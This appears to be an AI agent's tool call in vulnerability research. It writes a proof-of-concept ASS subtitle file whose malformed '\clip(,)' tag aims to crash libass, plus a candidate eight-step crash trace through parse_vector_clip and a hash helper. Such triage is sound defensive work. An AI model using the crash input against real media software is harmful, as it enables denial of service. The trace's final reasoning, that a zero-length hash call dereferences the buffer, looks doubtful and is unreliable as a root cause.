Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
from json import dumps
poc='''[Script Info]
Title: x
ScriptType: v4.00+
PlayResX: 1280
PlayResY: 720
[V4+ Styles]
Format: Name, Fontname, Fontsize, PrimaryColour, SecondaryColour, OutlineColour, BackColour, Bold, Italic, Underline, StrikeOut, ScaleX, ScaleY, Spacing, Angle, BorderStyle, Outline, Shadow, Alignment, MarginL, MarginR, MarginV, Encoding
Style: Default,Arial,20,&H00FFFFFF,&H000000FF,&H00000000,&H64000000,0,0,0,0,100,100,0,0,1,2,0,2,10,10,10,1
[Events]
Format: Layer, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, Text
Dialogue: 0,0:00:00.00,0:00:01.00,Default,,0,0,0,,{\\clip(,)}
'''
Path('/workspace/poc.bin').write_text(poc)
trace=[
{"step":1,"file":"src-vul/libass_fuzzer.cc","function":"LLVMFuzzerTestOneInput","line":39,"var":"data/size","code":"ASS_Track *track = ass_read_memory(ass_library, (char *)data, size, nullptr);","note":"The fuzz input is parsed as an ASS subtitle document."},
{"step":2,"file":"src-vul/libass/ass.c","function":"ass_read_memory","line":1342,"var":"newbuf","code":"memcpy(newbuf, buf, bufsize); newbuf[bufsize] = '\\0';","note":"The attacker-controlled bytes are copied into a NUL-terminated buffer."},
{"step":3,"file":"src-vul/libass/ass.c","function":"ass_read_memory","line":1346,"var":"track","code":"track = parse_memory(library, buf);","note":"The subtitle parser produces track and event structures from the input."},
{"step":4,"file":"src-vul/libass/ass_parse.c","function":"parse_vector_clip","line":235,"var":"text.start","code":"struct arg text = args[nargs - 1];","note":"The malformed \\clip(,) vector-clip payload is split so the last argument becomes empty."},
{"step":5,"file":"src-vul/libass/ass_parse.c","function":"parse_vector_clip","line":236,"var":"render_priv->state.clip_drawing_text.str","code":"render_priv->state.clip_drawing_text.str = text.start;","note":"The parser stores a string view pointing at the empty argument payload."},
{"step":6,"file":"src-vul/libass/ass_render.c","function":"update_font","line":1001,"var":"render_priv->state.family.str","code":"render_priv->state.family.str = style->FontName;","note":"The renderer later resets font state and rebuilds the current font descriptor."},
{"step":7,"file":"src-vul/libass/libass/ass_cache_template.h","function":"<global>","line":41,"var":"p->member.str / p->member.len","code":"hval = fnv_32a_buf(p->member.str, p->member.len, hval);","note":"The cache hash helper hashes descriptor string members during lookup."},
{"step":8,"file":"src-vul/libass/libass/ass_utils.h","function":"<global>","line":186,"var":"len == 0","code":"static inline uint32_t fnv_32a_buf(const void *buf, size_t len, uint32_t hval)","note":"If the malformed clip string view reaches this helper with zero length, the hash loop dereferences buf and can fault."}
]
Path('/workspace/candidate_trace.json').write_text(dumps(trace))
PY
python3 - <<'PY'
print(open('/workspace/candidate_trace.json').read())
PY
